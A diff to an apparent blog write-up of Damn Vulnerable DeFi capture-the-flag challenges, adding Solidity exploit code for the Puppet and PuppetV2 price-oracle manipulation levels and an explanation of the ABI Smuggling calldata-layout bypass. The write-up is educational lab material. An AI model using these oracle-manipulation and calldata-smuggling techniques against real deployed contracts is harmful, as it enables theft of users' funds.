@@ -405,7 +405,7 @@ Okay, but maybe we can create an accounting error using a correct `Claim`. How d
     }
 ```
 
-This is where some funky bit manipulation comes in. Ignore it for now. The immediate line of interest throws `revert AlreadyClaimed()` if `_setClaimed` returns `false`. This is how they must be trying to stop double claiming. Let's assume for a moment that `_setClaimed` is entirely correct. `_setClaimed` is only checked if the current `Claim` is using a different token than the previous. It seems like this is intended functionality because there would be no reason to not check every iteration. Maybe one beneficiary could have multiple `Claim`s on the same `token` and `batchNumber`. However, this only stops us from calling the function again or interleaving `Claim`s from the same batch. **It does not check if a specific Claim has been used before**.
+This is where some funky bit manipulation comes in. Ignore it for now. The immediate line of interest reverts with `AlreadyClaimed()` if `_setClaimed` returns `false`. This is how they must be trying to stop double claiming. Let's assume for a moment that `_setClaimed` is entirely correct. `_setClaimed` is only checked if the current `Claim` is using a different token than the previous. It seems like this is intended functionality because there would be no reason to not check every iteration. Maybe one beneficiary could have multiple `Claim`s on the same `token` and `batchNumber`. However, this only stops us from calling the function again or interleaving `Claim`s from the same batch. **It does not check if a specific Claim has been used before**.
 
 This exploit is quite long due to all the setup with deserialization and building `Claim`s. Here's the rundown:
 1. Build our legitimate `Claim`s for each token, `weth` and `dvt`
@@ -533,7 +533,7 @@ Here's a little snip from the `TrustfulOracle` contract:
     }
 ```
 
-Each oracle is simple an externally owned account that is allowed to report a price to the `TrustfulOracle`. The `TrustfulOracle` computes the price it buys and sells for based off of the median of the three oracles. The median is actually a decent choice here. The median of a set is the just middle number when sorted. Imagine if they used averages and one oracle was malicious or compromised. The prices could look like `(1.5 eth, 1.3 eth, 9999999 eth)`. The average would be `3,333,335.8 eth`, but the median would only be `1.5 eth`. To abitrarily control the median, you would need to control over half the oracles.
+Each oracle is simply an externally owned account that is allowed to report a price to the `TrustfulOracle`. The `TrustfulOracle` computes the price it buys and sells for based off of the median of the three oracles. The median is actually a decent choice here. The median of a set is the just middle number when sorted. Imagine if they used averages and one oracle was malicious or compromised. The prices could look like `(1.5 eth, 1.3 eth, 9999999 eth)`. The average would be `3,333,335.8 eth`, but the median would only be `1.5 eth`. To abitrarily control the median, you would need to control over half the oracles.
 
 Wait.
 
@@ -622,6 +622,55 @@ There’s a DVT market opened in an old Uniswap v1 exchange, currently with 10 E
 Pass the challenge by saving all tokens from the lending pool, then depositing them into the designated recovery account. You start with 25 ETH and 1000 DVTs in balance.
 ```
 
+First, we gotta talk about Uniswap. The general idea is that it's an exchange for ERC20 tokens; you can swap one token for another. However, its pricing is dynamically computed based on supply and demand. In this challenge, it's just swapping ETH for DVT, so nothing too crazy. The `PuppetPool` uses this exchange as a price oracle to determine how much you have to deposit in ETH to borrow DVT.
+
+```solidity
+    function _computeOraclePrice() private view returns (uint256) {
+        // calculates the price of the token in wei according to Uniswap pair
+        return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
+    }
+```
+
+Interesting! If we could drain Uniswap's balance, we could take all of the DVT from `PuppetPool` for free. Let's see how the challenge set up our accounts.
+
+```solidity
+    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
+    uint256 constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;
+
+    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 1000e18;
+    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 25e18;
+
+    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;
+```
+
+Well, this is awkward. We have 100x more DVT and 2.5x more ETH than Uniswap. The exploit kinda just falls out from here:
+1. Sell as much DVT to Uniswap as possible to drive down the price
+2. Use our initial ETH and our newly acquired ETH to borrow everything from the pool
+
+<br/>
+
+✨ _We do a little market manipulation_ ✨
+
+```solidity
+contract Exploit {
+    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;
+
+    constructor() payable {}
+
+    function win(DamnValuableToken token, PuppetPool lendingPool, IUniswapV1Exchange exchange, address recovery) public {
+        // 1. Sell DVT to Uniswap until it runs out of ETH
+        uint256 amount = token.balanceOf(address(this));
+        token.approve(address(exchange), amount);
+        exchange.tokenToEthTransferInput(amount, 1, block.timestamp, address(this));
+
+        // 2. Borrow all DVT from PuppetPool (cost should be 0 or near it)
+        lendingPool.borrow{value: address(this).balance}(POOL_INITIAL_TOKEN_BALANCE, recovery);
+    }
+
+    receive() external payable {}
+}
+```
+
 ## 9. Puppetv2
 ```
 The developers of the previous pool seem to have learned the lesson. And released a new version.
@@ -633,6 +682,37 @@ You start with 20 ETH and 10000 DVT tokens in balance. The pool has a million DV
 Save all funds from the pool, depositing them into the designated recovery account.
 ```
 
+I initially tried to get fancy here, but it didn't work out (i.e. I didn't understand the function calls). It's the same problem, but now with UniswapV2. The hardest part is finding any good documentation on how to actually call the functions.
+
+This time there are two (2) tokens involved and still the ability to swap for ETH. For each token registered with the exchange, there's a `UniswapV2Pair` between it and every other token. The `UniswapV2Router` can be given a `path` of tokens it should swap for, and it will iteratively swap out tokens until reaching the end using these pairs. For example, DVT -> DAI -> WETH would swap DVT for DAI, and then DAI for WETH. This can be done via `UniswapV2Router.swapTokensForExactTokens`, but it doesn't seem to actually transfer the tokens to you. I think maybe it just keeps it in accounting?
+
+The function `UniswapV2Router.swapExactTokensForETH` is the same idea but the last token has to be WETH. The big difference is that it unwraps the WETH and sends you ETH. 
+
+Alright, we've fucked around, let's find out. The exploit is as follows:
+1. Approve the `UniswapV2Router` for all your DVT
+2. Use the `UniswapV2Router` to swap your DVT for ETH
+3. Borrow everything from the `PuppetV2Pool`
+
+<br/>
+
+```
+    function test_puppetV2() public checkSolvedByPlayer {
+        address[] memory path;
+        path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+
+        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
+        uniswapV2Router.swapExactTokensForETH(PLAYER_INITIAL_TOKEN_BALANCE, UNISWAP_INITIAL_WETH_RESERVE * 99/100, path, player, block.timestamp);
+
+        weth.deposit{value: player.balance-(0.1 ether)}();
+        weth.approve(address(lendingPool), weth.balanceOf(player));
+        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
+    }
+```
+
+
 ## 15. ABI Smuggling
 ```
 There’s a permissioned vault with 1 million DVT tokens deposited. The vault allows withdrawing funds periodically, as well as taking all funds out in case of emergencies.
@@ -642,4 +722,83 @@ The contract has an embedded generic authorization scheme, only allowing known a
 The dev team has received a responsible disclosure saying all funds can be stolen.
 
 Rescue all funds from the vault, transferring them to the designated recovery account.
+```
+
+Let's start with the big picture. `SelfAuthorizedVault` inherits from `AuthorizedExecutor`. `AuthorizedExecutor` has a one-time setup called `setPermissions` that decides which `executor` can call what function (by `selector`) on which `target`. `SelfAuthorizedVault` has a guard on both the `withdraw` and `sweepFunds` that reverts transactions if the vault isn't `msg.sender`.
+
+```solidity
+    modifier onlyThis() {
+        if (msg.sender != address(this)) {
+            revert CallerNotAllowed();
+        }
+        _;
+    }
+
+    function withdraw(address token, address recipient, uint256 amount) external onlyThis {...}
+
+    function sweepFunds(address receiver, IERC20 token) external onlyThis {...}
+```
+
+Simply put, the `onlyThis` looks pretty ironclad. The only way we're calling those functions is from `address(this)`. This is intended because using `AuthorizedExecutor.execute` will call it on our behalf, if we have the permission. In the challenge `setUp` function, we can see that `player` is given permissions to call the function with the selector `hex"d9caed12"`.
+
+```solidity
+    bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault));
+```
+
+This corresponds to `withdraw`, which only lets us withdraw 1 ether every 15 days. Obviously, this is too slow, and we'll need to call `sweepFunds`. Let's take a look at `execute` and see if we can bypass the permission check.
+
+```solidity
+    function execute(address target, bytes calldata actionData) external nonReentrant returns (bytes memory) {
+        // Read the 4-bytes selector at the beginning of `actionData`
+        bytes4 selector;
+        uint256 calldataOffset = 4 + 32 * 3; // calldata position where `actionData` begins
+        assembly {
+            selector := calldataload(calldataOffset)
+        }
+
+        if (!permissions[getActionId(selector, msg.sender, target)]) {
+            revert NotAllowed();
+        }
+
+        _beforeFunctionCall(target, actionData);
+
+        return target.functionCall(actionData);
+    }
+
+    function getActionId(bytes4 selector, address executor, address target) public pure returns (bytes32) {
+        return keccak256(abi.encodePacked(selector, executor, target));
+    }
+```
+
+Immediately, something is weird. It's calculating some offset into its own raw calldata and ripping out `selector`. Since `selector` is being used to determine which functions we can call, it must be legitimately where the function selector exists in memory. What if we could construct calldata for `execute` that would have `withdraw` at `calldataOffset` but cause it to call `sweepFunds` instead?
+
+We'll need to dive deep into [how Ethereum calls functions](https://docs.soliditylang.org/en/latest/abi-spec.html) at a low-level to solve this one. Each function of a contract has a [4-byte selector](https://docs.soliditylang.org/en/latest/abi-spec.html#function-selector) that's calculated by hashing the function signature with Keccak256 and taking the first four bytes. All spaces, argument names, and data location specifiers are removed. The return type is not included and contract types are [converted](https://docs.soliditylang.org/en/latest/abi-spec.html#function-selector) to `address`.
+
+```bash
+┌──(samson)─[184]─[20:05:44]─[0:00:00.008073]─[kali@DESKTOP-0Q6Q7UG]─[/home/kali]
+└─$ keccak256.hash(b'withdraw(address,address,uint256)')[:4].hex()
+<Bytes: b'd9caed12', byteorder='big'>
+
+┌──(samson)─[185]─[20:07:13]─[0:00:00.011920]─[kali@DESKTOP-0Q6Q7UG]─[/home/kali]
+└─$ keccak256.hash(b'sweepFunds(address,address)')[:4].hex()
+<Bytes: b'85fb709d', byteorder='big'>
+```
+
+The contract is then able to lookup the function and execute it. The arguments proceed directly after. If the argument type is dynamically sized like `bytes`, `string`, or `T[]`, then an offset from the **start** of the arguments block to the real location is placed there instead. All elementary types are padded to 32 bytes with padding direction depending on the type. All higher-order types can be recursively deconstructed into these elementary types.
+
+So `execute(address target, bytes calldata actionData)` turns into
+`[selector (4 bytes)][address (32 bytes)][actionDataOffset (32 bytes)][actionDataSize (32 bytes)][actionData (32*k bytes)]`.
+
+Because `actionData` will have the `callData`.
+```
+[selector (4 bytes)][address (32 bytes)][actionDataOffset (32 bytes)][actionDataSize (32 bytes)][[selector (4 bytes)][argument block]]
+                                                                                                 ^
+                                                                                                 uint256 calldataOffset = 4 + 32 * 3;
+```
+
+Note that nothing says you can't insert garbage between the argument block and the dynamic data block.
+```
+[selector (4 bytes)][address (32 bytes)][actionDataOffset + 0x20 (32 bytes)]*[GARBAGE (32 bytes)]*[actionDataSize (32 bytes)][actionData (32*k bytes)]
+                                                                             ^
+                                                                             uint256 calldataOffset = 4 + 32 * 3;
 ```
